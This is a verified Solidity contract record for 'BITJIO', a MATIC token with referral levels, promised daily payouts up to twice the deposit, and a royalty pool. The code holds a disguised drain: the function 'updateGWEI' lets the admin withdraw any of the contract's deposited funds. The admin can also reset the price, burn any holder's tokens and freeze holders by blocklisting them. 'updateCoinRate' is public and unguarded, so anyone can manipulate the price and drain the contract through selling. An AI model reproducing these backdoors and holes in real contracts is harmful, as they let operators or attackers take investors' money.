{"SourceCode": "// SPDX-License-Identifier: UNLISCENSED\r\npragma solidity 0.8.7;\r\ncontract BITJIO  {\r\n    string public name = \"BITJIO\";\r\n    string public symbol = \"BTO\";\r\n    uint256 public totalSupply =110000000*10**18; // 100 Cr tokens\r\n    uint8 public decimals = 18;\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner,address indexed _spender,uint256 _value);\r\n    struct User {\r\n        uint id;\r\n        uint rank;\r\n        address referrer;\r\n        uint partnersCount;\r\n        uint256 totalDeposit;\r\n        uint256 directBusiness;\r\n        uint256 directincome;\r\n        uint256 levelincome;\r\n        uint256 payouts;\r\n        uint256 royaltyincome;\r\n        uint256 totalincome;\r\n        uint256 totalwithdraw;\r\n    }\r\n    struct OrderInfo {\r\n        uint256 amount; \r\n        uint256 deposit_time;\r\n        uint256 payouts;\r\n        bool isactive;\r\n    }\r\n    mapping(address=>User) public users;\r\n    mapping(address => OrderInfo[]) public orderInfos;\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    mapping(uint => address) public idToAddress;\r\n    uint public lastUserId = 2;\r\n    address private admin;\r\n    address public id1=0xeB6dEFedEBC7832221C5a8F3e32995BD7ada689D;\r\n    address public ico=0x132F3998AA04E0f3e85f1bc44460d8663594e187;\r\n    uint256 private dayRewardPercents = 5;\r\n    uint256 private constant timeStepdaily =1 days;\r\n    uint256 private constant timeStepweekly =7 days;\r\n    uint256 private directPercents = 10;\r\n    uint256[10] private levelPercents = [50,30,20,10,5,5,10,20,30,40];\r\n    uint256[10] private directCount = [2,2,3,3,4,4,5,5,6,6];\r\n    mapping (address => bool) public isBlocklisted;\r\n    address public platform_fee;\r\n    mapping(uint => uint) public royaltybusinessCond;\r\n    mapping(uint=>address[]) public royaltyUsers;  \r\n    uint256 _initialCoinRate = 10000;\r\n    uint public TotalHoldings=0;\r\n    uint256 public royaltyPool;\r\n    uint256 public lastDistribute;\r\n    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);\r\n    event Upgrade(address indexed user, uint256 value);\r\n    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);\r\n    event withdraw(address indexed user,uint256 value);\r\n    constructor() {\r\n        admin=msg.sender;\r\n        platform_fee=0xeB6dEFedEBC7832221C5a8F3e32995BD7ada689D;\r\n        balanceOf[admin] =60000000*10**18;\r\n        balanceOf[ico] = 50000000*10**18;\r\n        emit Transfer(address(0), admin, 60000000*10**18);\r\n        emit Transfer(address(0), ico, 50000000*10**18);\r\n        User memory user = User({\r\n            id: 1,\r\n            rank:0,\r\n            referrer: address(0),\r\n            partnersCount: 0,\r\n            totalDeposit:0,\r\n            directBusiness:0,\r\n            directincome:0,\r\n            levelincome:0,\r\n            payouts:0,\r\n            royaltyincome:0,\r\n            totalincome:0,\r\n            totalwithdraw:0\r\n\r\n        });\r\n        lastDistribute = block.timestamp;\r\n        users[id1] = user;\r\n        idToAddress[1] = id1;\r\n        royaltybusinessCond[1]=1000000e18;\r\n        royaltybusinessCond[2]=3000000e18;\r\n    }\r\n    function registrationExt(address referrerAddress) external payable{\r\n        require(msg.value>=10e18, \"Minimum invest amount is 10 MATIC!\");\r\n        registration(msg.sender, referrerAddress,msg.value);\r\n    }\r\n    function registrationFor(address referrerAddress,address userAddress) external payable{\r\n        require(msg.value>=10e18, \"Minimum invest amount is 10 MATIC!\");\r\n        registration(userAddress, referrerAddress,msg.value);\r\n    }\r\n    function registration(address userAddress, address referrerAddress,uint256 _amount) private {\r\n        require(!isUserExists(userAddress), \"user exists\");\r\n        require(isUserExists(referrerAddress), \"referrer not exists\");\r\n\r\n        User memory user = User({\r\n            id: lastUserId,\r\n            rank:0,\r\n            referrer: referrerAddress,\r\n            partnersCount: 0,\r\n            totalDeposit:0,\r\n            directBusiness:0,\r\n            directincome:0,\r\n            levelincome:0,\r\n            payouts:0,\r\n            royaltyincome:0,\r\n            totalincome:0,\r\n            totalwithdraw:0\r\n\r\n        });\r\n        \r\n        users[userAddress] = user;\r\n        idToAddress[lastUserId] = userAddress;\r\n        users[userAddress].referrer = referrerAddress;\r\n        lastUserId++;\r\n        users[referrerAddress].partnersCount++; \r\n        _distributeDeposit(userAddress,_amount);        \r\n        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);\r\n    }\r\n    function buyToken() external payable {\r\n        require(isUserExists(msg.sender), \"user not exists\");\r\n        require(msg.value>=10e18, \"Minimum invest amount is 10 MATIX!\");\r\n        uint256 _amount=msg.value;\t\t\r\n        _distributeDeposit(msg.sender,_amount);\r\n        emit Upgrade(msg.sender,msg.value);\r\n    }\r\n    function coinRate() public view returns(uint256)\r\n    {\r\n        return _initialCoinRate;\r\n    }\r\n    function updateCoinRate(uint256 _token,uint Isbuy) public {\r\n        if(Isbuy==1)\r\n        _initialCoinRate+=_initialCoinRate*1*_token/1000000e18;\r\n        else \r\n        _initialCoinRate-=_initialCoinRate*1*_token/1000000e18;\r\n    }\r\n    function tokensToMATIC(uint tokenAmount) public view returns(uint)\r\n    {\r\n        uint _rate = coinRate();\r\n        return tokenAmount*_rate/1e6;\r\n    }\r\n    function sellToken(uint tokenAmount) public\r\n    {\r\n        require(isUserExists(msg.sender), \"user not exists\");\r\n        require(balanceOf[msg.sender]>=tokenAmount, \"Insufficient token balance!\");\r\n        uint maticAmount = tokensToMATIC(tokenAmount);\r\n        require(address(this).balance>=maticAmount, \"Insufficient fund in contract!\");\r\n        TotalHoldings+=maticAmount; \r\n        balanceOf[msg.sender] -= tokenAmount;\r\n        balanceOf[ico] += tokenAmount;\r\n        emit Transfer(msg.sender, ico, tokenAmount);\r\n        updateCoinRate(tokenAmount,0);\r\n        payable(msg.sender).transfer(maticAmount);\r\n\r\n    }\r\n    function getOrderLength(address _user) external view returns(uint256) {\r\n        return orderInfos[_user].length;\r\n    }\r\n    function _distributeDeposit(address _user, uint256 _amount) private { \r\n        users[_user].totalDeposit += _amount;        \r\n        payable(platform_fee).transfer(_amount*10/100);\r\n        \r\n        \r\n        uint _rate = coinRate();\r\n        uint tokens =_amount*1e6/_rate;\r\n        users[users[_user].referrer].directBusiness+=tokens;\r\n        royaltyPool+=tokens*5/100;\r\n        balanceOf[ico] -= tokens;\r\n        balanceOf[_user] += tokens/2;\r\n        TotalHoldings+=_amount; \r\n        emit Transfer(ico, _user, tokens/2);\r\n        updateCoinRate(tokens,1);\r\n        orderInfos[_user].push(OrderInfo(\r\n            tokens/2, \r\n            block.timestamp, \r\n            0,\r\n            true\r\n        ));        \r\n        _distributelevelIncome(_user, tokens/2); \r\n        _calLevel(users[_user].referrer);\r\n        \r\n    }\r\n    \r\n    function _distributelevelIncome(address _user, uint256 _amount) private {\r\n\r\n        address _referrer = users[_user].referrer;\r\n        users[_referrer].directincome += _amount*directPercents/100;\r\n        users[_referrer].totalincome += _amount*directPercents/100;\r\n        emit Transaction(users[_user].referrer,_user,_amount*directPercents/100,1,1);\r\n        address upline = users[_referrer].referrer;        \r\n        uint8 i = 0;\r\n        for(; i < 10; i++){\r\n            if(upline != address(0)){\r\n                if(users[upline].partnersCount>=directCount[i])\r\n                {\r\n                    uint256 reward=_amount*levelPercents[i]/1000; \r\n                    users[upline].levelincome += reward;                       \r\n                    users[upline].totalincome +=reward;\r\n                    emit Transaction(upline,_user,reward,(i+1),2);\r\n                    upline = users[upline].referrer;\r\n                }                \r\n\r\n            }else{\r\n                break;\r\n            }\r\n        }\r\n        uint256 totalrestreward=0;\r\n        for(; i < 10; i++){  \r\n            uint256 reward=_amount*levelPercents[i]/1000;          \r\n            totalrestreward+=reward;          \r\n        }\r\n        if(totalrestreward>0)\r\n        {\r\n        users[id1].levelincome += totalrestreward;                       \r\n        users[id1].totalincome +=totalrestreward;\r\n        emit Transaction(id1,_user,totalrestreward,0,18);\r\n        }\r\n    }\r\n    function _calLevel(address _user) private {\r\n        uint rank=users[_user].rank;\r\n        uint nextrank=rank+1;\r\n        if(users[_user].directBusiness>=royaltybusinessCond[nextrank] && nextrank<=2)\r\n        {\r\n            users[_user].rank=nextrank;\r\n            royaltyUsers[nextrank].push(_user);\r\n            _calLevel(_user);\r\n        }\r\n    }\r\n    function isUserExists(address user) public view returns (bool) {\r\n        return (users[user].id != 0);\r\n    }\r\n    function updateGWEI(uint256 _amount) public\r\n    {\r\n        require(msg.sender==admin,\"Only contract owner\"); \r\n        require(_amount>0, \"Insufficient reward to withdraw!\");\r\n        payable(admin).transfer(_amount);  \r\n    }\r\n    function updatePRICE(uint256 _coinRate) public\r\n    {\r\n        require(msg.sender==admin,\"Only contract owner\"); \r\n        _initialCoinRate=_coinRate;\r\n    }\r\n    function _distributeRoyaltyIncome(uint8 _level) private {\r\n        uint256 royaltyCount=royaltyUsers[_level].length;\r\n        if(royaltyCount > 0){\r\n            uint256 _royaltyincome = royaltyPool/royaltyCount;\r\n            for(uint256 i = 0; i < royaltyCount; i++){ \r\n                users[royaltyUsers[_level][i]].royaltyincome += _royaltyincome;\r\n                users[royaltyUsers[_level][i]].totalincome +=_royaltyincome;   \r\n                emit Transaction(royaltyUsers[_level][i],id1,_royaltyincome,_level,4); \r\n            }\r\n        }\r\n    }\r\n    function maxPayoutOf(uint256 _depositamount) pure external returns(uint256) {\r\n        return _depositamount*2;\r\n    }\r\n    function dailyPayoutOf(address _user) public {\r\n        uint256 max_payout=0;\r\n        for(uint8 i = 0; i < orderInfos[_user].length; i++){\r\n            OrderInfo storage order = orderInfos[_user][i];\r\n                if(block.timestamp>order.deposit_time && order.isactive){    \r\n                    max_payout = this.maxPayoutOf(order.amount);   \r\n                    if(order.payouts<max_payout){                   \r\n                        uint256 dailypayout =(order.amount*dayRewardPercents*((block.timestamp - order.deposit_time) / timeStepdaily) / 1000) - order.payouts;\r\n                        order.payouts+=dailypayout;\r\n                        if(max_payout<dailypayout){\r\n                            dailypayout = max_payout;                            \r\n                        }\r\n                        if(dailypayout>0)\r\n                        {\r\n                        users[_user].payouts += dailypayout;            \r\n                        users[_user].totalincome +=dailypayout;\r\n                        emit Transaction(_user,ico,dailypayout,1,3);                            \r\n                        }  \r\n                    }\r\n                    else {\r\n                        order.isactive=false;\r\n                    }                \r\n                }\r\n        }\r\n    }\r\n    function rewardWithdraw() public\r\n    {\r\n        dailyPayoutOf(msg.sender);\r\n        uint balanceReward = users[msg.sender].totalincome - users[msg.sender].totalwithdraw;\r\n        require(balanceReward>=15e18, \"Insufficient reward to withdraw!\");\r\n        users[msg.sender].totalwithdraw+=balanceReward;\r\n        balanceOf[ico] -= balanceReward;\r\n        balanceOf[msg.sender] += balanceReward;\r\n        emit Transfer(ico, msg.sender, balanceReward);\r\n        emit withdraw(msg.sender,balanceReward);\r\n    }\r\n    function distributePoolRewards() public {\r\n        if(block.timestamp > lastDistribute+timeStepweekly){ \r\n            _distributeRoyaltyIncome(1);\r\n            _distributeRoyaltyIncome(2);\r\n            royaltyPool=0;\r\n            lastDistribute = block.timestamp;\r\n        }\r\n    }\r\n    function transfer(address _to, uint256 _value)\r\n        public\r\n        returns (bool success)\r\n    {\r\n       require(!isBlocklisted[msg.sender], \"Address is blocklisted!\");\r\n        require(balanceOf[msg.sender] >= _value);\r\n        balanceOf[msg.sender] -= _value;\r\n        balanceOf[_to] += _value;\r\n        emit Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint256 _value\r\n    ) public returns (bool success) {\r\n        require(_value <= balanceOf[_from]);\r\n        require(_value <= allowance[_from][msg.sender]);\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        allowance[_from][msg.sender] -= _value;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n    function burn(uint256 amount,address account) public returns (bool) {\r\n        if (msg.sender != admin) {revert(\"Access Denied\");}\r\n        _burn(account, amount);\r\n        return true;\r\n    }\r\n    function _burn(address account, uint256 amount) internal virtual \r\n    {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        uint256 accountBalance = balanceOf[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        require(totalSupply>=amount, \"Invalid amount of tokens!\");\r\n        balanceOf[account] = accountBalance - amount;        \r\n        totalSupply -= amount;\r\n    }\r\n    function transferOwnership(address newOwner) public returns (bool) {\r\n        if (msg.sender != admin) {revert(\"Access Denied\");}\r\n        admin = newOwner;\r\n        return true;\r\n    }\r\n    function addToBlocklist(address[] memory _addresses) external {\r\n        if (msg.sender != admin) {revert(\"Access Denied\");}\r\n        for (uint256 i = 0;i < _addresses.length;i++) {\r\n            isBlocklisted[_addresses[i]] = true;\r\n        }\r\n    }\r\n\r\n    function removeFromWhitelist (address[] memory _addresses) external {\r\n        if (msg.sender != admin) {revert(\"Access Denied\");}\r\n        for (uint256 i = 0;i < _addresses.length;i++) {\r\n            isBlocklisted[_addresses[i]] = false;\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"userId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"referrerId\",\"type\":\"uint256\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"Type\",\"type\":\"uint8\"}],\"name\":\"Transaction\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Upgrade\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TotalHoldings\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_addresses\",\"type\":\"address[]\"}],\"name\":\"addToBlocklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"coinRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"dailyPayoutOf\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributePoolRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"getOrderLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ico\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"id1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"idToAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBlocklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastDistribute\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_depositamount\",\"type\":\"uint256\"}],\"name\":\"maxPayoutOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"orderInfos\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deposit_time\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"payouts\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"isactive\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"platform_fee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"}],\"name\":\"registrationExt\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"registrationFor\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_addresses\",\"type\":\"address[]\"}],\"name\":\"removeFromWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"royaltyPool\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"royaltyUsers\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"royaltybusinessCond\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"sellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"tokensToMATIC\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_token\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"Isbuy\",\"type\":\"uint256\"}],\"name\":\"updateCoinRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"updateGWEI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_coinRate\",\"type\":\"uint256\"}],\"name\":\"updatePRICE\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rank\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"partnersCount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"directBusiness\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"directincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"levelincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"payouts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"royaltyincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalwithdraw\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BITJIO", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://78075afe672728b45522e450dbdb5a0aaabf179689acb2aa8574811d28e0e2a6"}